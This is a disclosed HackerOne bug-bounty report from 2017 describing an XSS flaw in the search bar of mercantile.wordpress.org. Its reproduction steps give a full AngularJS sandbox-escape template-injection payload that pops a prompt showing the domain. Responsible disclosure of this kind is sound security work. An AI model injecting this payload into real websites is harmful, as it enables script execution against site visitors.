# XSS in the search bar of mercantile.wordpress.org

## Report Details
- **Report ID**: 221893
- **URL**: https://hackerone.com/reports/221893
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-04-18T13:40:36.012Z
- **Disclosed**: 2017-05-20T12:03:33.225Z

## Reporter
- **Username**: codertom
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hi wordpress! Glad to see you here at H1.

       I found a XSS issue in the https://mercantile.wordpress.org/s=<payload here>
This works with the angular js payloads. I did inject a angular js code its because I found the `ng-bindable` in the source.

###STEPS TO REPRODUCE
1. Go to https://mercantile.wordpress.org
2. Click on search and put this payload:
>
`{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}`
As you could now see the domain has been popped up.

If you have any questions just tell me and I will try my best to have an answer.

Kind Regards,
Tom
    


## Attachments
No attachments
